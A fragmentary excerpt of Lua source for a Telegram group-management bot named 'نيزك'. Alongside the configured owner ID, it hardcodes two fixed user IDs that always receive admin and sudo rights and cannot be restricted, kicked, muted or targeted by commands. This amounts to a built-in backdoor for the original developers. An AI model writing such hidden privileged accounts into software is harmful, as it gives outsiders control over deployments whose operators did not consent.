...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1755055191 then 
Adminn = true
...
----------------------{ Get Name Bot }-----------------------------
Bot_Name = redis:get(js..":NameBot:") or "نيزك"
...
result = false
if msg.sender_user_id_ == 1714422669 or msg.sender_user_id_ == 1755055191 then 
SudoBase = true
...
elseif UserID == 1714422669 or UserID == 1755055191 then 
return sendMsg(ChatID,MsgID,"- لا يمكنك تقييد *مطورين النيزك* ؛") 
elseif redis:sismember(js..':SUDO_BOT:',UserID) then 
...
elseif UserID == 1714422669 or UserID == 1755055191 then 
return sendMsg(ChatID,MsgID,"- لا يمكنك طرد *مطورين النيزك* ؛") 
elseif UserID == SUDO_ID then 
...
elseif UserID == 1714422669 or UserID == 1755055191 then 
return sendMsg(ChatID,MsgID,"- لا يمكنك كتم *مطورين النيزك* ؛") 
elseif UserID == SUDO_ID then 
...
if UserID == 1714422669 or UserID == 1755055191 then return sendMsg(ChatID,MsgID,"- لا يمكنك تنفيذ الامر ضد *مطورين النيزك* ") end
